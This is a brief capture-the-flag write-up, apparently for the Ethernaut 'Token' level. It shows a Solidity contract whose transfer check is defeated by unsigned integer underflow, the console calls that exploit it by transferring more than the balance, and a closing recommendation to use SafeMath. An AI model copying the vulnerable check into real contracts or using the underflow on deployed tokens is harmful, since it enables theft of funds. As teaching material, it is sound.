# Token

```javascript=
pragma solidity ^0.4.18;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  function Token(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

This is about Solidity's underflow problem, although `require(balances[msg.sender] - _value >= 0);` try to confirm that require withdraw are not greater than balance.

However, according to underflow problem in Solidity, `1-2` will be a big number close to `MAX` in Solidity.

Let's make sure how many balance we got in this account, then just determind a greater number to `transfer()`.

```javascript
contract.balanceOf(player);
contract.transfer(0xXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/*any address*/, 21)
contract.balanceOf(player);
```

![](https://i.imgur.com/tQwSP9h.png)

Use `SafeMath` for every calculate in Solidity.